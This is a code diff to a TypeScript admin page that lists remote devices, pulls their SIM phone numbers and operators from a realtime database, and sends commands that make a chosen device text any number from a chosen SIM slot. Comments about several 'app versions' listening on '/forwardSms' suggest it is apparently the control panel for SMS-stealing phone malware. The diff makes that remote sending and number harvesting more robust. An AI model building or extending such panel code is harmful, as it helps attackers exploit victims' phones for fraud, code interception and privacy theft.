@@ -61,8 +61,8 @@ function parseDevice(raw: Record<string, unknown>): DeviceInfo {
   let simNumber = '', simOperator = '';
   if (Array.isArray(sims) && sims.length > 0) {
     const s0 = sims[0] as Record<string, unknown>;
-    simNumber = toStr(s0?.phoneNumber ?? s0?.number ?? s0?.phone);
-    simOperator = toStr(s0?.operator ?? s0?.provider ?? s0?.carrier ?? s0?.network);
+    simNumber = toStr(s0?.phoneNumber ?? s0?.number ?? s0?.phone ?? s0?.simNumber ?? s0?.mobNo ?? s0?.PhoneNumber ?? s0?.mobile ?? s0?.subscriberId ?? s0?.SubscriberId);
+    simOperator = toStr(s0?.operator ?? s0?.Operator ?? s0?.provider ?? s0?.Provider ?? s0?.carrier ?? s0?.Carrier ?? s0?.network ?? s0?.Network ?? s0?.networkName ?? s0?.operatorName ?? s0?.displayName);
     if (simNumber && !flat['phoneNumber']) flat['phoneNumber'] = simNumber;
     if (simOperator && !flat['operator']) flat['operator'] = simOperator;
   }
@@ -73,7 +73,7 @@ function parseDevice(raw: Record<string, unknown>): DeviceInfo {
   const model = toStr(firstVal(flat, ['modelName','model','Model','deviceModel','Device']));
   const fullModel = brand && model && !model.toLowerCase().startsWith(brand.toLowerCase())
     ? `${brand} ${model}` : (model || brand || '');
-  const phone = toStr(firstVal(flat, ['mobNo','MobNo','phoneNumber','PhoneNumber','phone','mobile','number','Number']));
+  const phone = toStr(firstVal(flat, ['mobNo','MobNo','phoneNumber','PhoneNumber','phone','Phone','mobile','Mobile','number','Number','simNumber','SimNumber','subscriberId','SubscriberId','mobileNumber','cellNumber']));
   const operator = toStr(firstVal(flat, ['provider','Provider','network','Network','operator','Operator','carrier']));
 
   return {
@@ -217,11 +217,31 @@ export default function DeviceDetailPage() {
     if (!sendTo.trim() || !sendBody.trim()) return;
     setSending(true); setSendStatus(null);
     try {
-      await adminRtdb('POST', '/forwardSms', {
-        to: sendTo.trim(), body: sendBody.trim(),
-        simSlot: sendSlot, channel: sendSlot,
-        deviceId: id, targetDeviceId: id, timestamp: Date.now(),
-      });
+      // payload with all known field name variants (different app versions use different keys)
+      const payload = {
+        to: sendTo.trim(),
+        number: sendTo.trim(),
+        phoneNumber: sendTo.trim(),
+        body: sendBody.trim(),
+        message: sendBody.trim(),
+        smsBody: sendBody.trim(),
+        simSlot: sendSlot,
+        simSlotIndex: sendSlot,
+        sim: sendSlot,
+        slot: sendSlot,
+        channel: sendSlot,
+        deviceId: id,
+        targetDeviceId: id,
+        id,
+        timestamp: Date.now(),
+        time: Date.now(),
+        status: 'pending',
+      };
+      // try both paths — some apps listen on /forwardSms (push), others on /forwardSms/{deviceId} (set)
+      await Promise.allSettled([
+        adminRtdb('POST', '/forwardSms', payload),
+        adminRtdb('POST', `/forwardSms/${id}`, payload),
+      ]);
       setSendStatus({ ok: true, msg: 'SMS dispatched successfully!' });
       setSendBody('');
     } catch (e) {
